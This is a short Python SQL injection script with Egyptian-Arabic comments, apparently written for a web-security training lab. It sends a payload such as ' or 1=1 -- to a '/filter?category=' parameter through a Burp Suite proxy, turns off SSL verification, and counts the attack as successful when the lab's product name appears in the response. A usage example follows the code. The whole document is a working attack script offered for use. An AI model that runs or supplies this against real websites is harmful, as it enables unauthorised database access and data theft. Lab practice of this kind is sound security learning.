# استيراد المكتبات اللازمة
import requests          # مكتبة لإرسال طلبات HTTP (زي اللي بنعمله في Burp)
import sys               # مكتبة للتعامل مع المدخلات من الـ Terminal (الأوامر)
import urllib3           # مكتبة للتعامل مع تحذيرات SSL

# إيقاف تحذيرات SSL (عشان مش بنستخدم HTTPS موثوق)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد الـ Proxy عشان نروح كل الطلبات على Burp Suite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# تعريف الدالة (الفنكشن) اللي هتعمل الهجوم
def exploit_sqli(url, payload):
    
    # الـ URI اللي فيه الثغرة (نفس اللي في اللاب)
    uri = '/filter?category='
    
    # إرسال الطلب مع الـ payload
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    
    # التحقق من وجود "Cat Grin" في الرد → معناها إن الـ payload نجح
    if "Cat Grin" in r.text:
        return True
    else:
        return False


# الجزء ده بيشتغل لما ننفذ السكريبت مباشرة
if __name__ == "__main__":
    
    try:
        # أخذ الـ URL من الأمر (أول باراميتر)
        url = sys.argv[1].strip()
        
        # أخذ الـ Payload من الأمر (تاني باراميتر)
        payload = sys.argv[2].strip()
        
    except IndexError:
        # لو المستخدم مكتبش URL أو Payload
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)   # إنهاء البرنامج
        
    # تنفيذ الهجوم وطباعة النتيجة
    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")


---
## How to use 
**python3 name.py url payload **
```bash
python3 sqli_exploit.py http://example.com ' or 1=1 --'
```
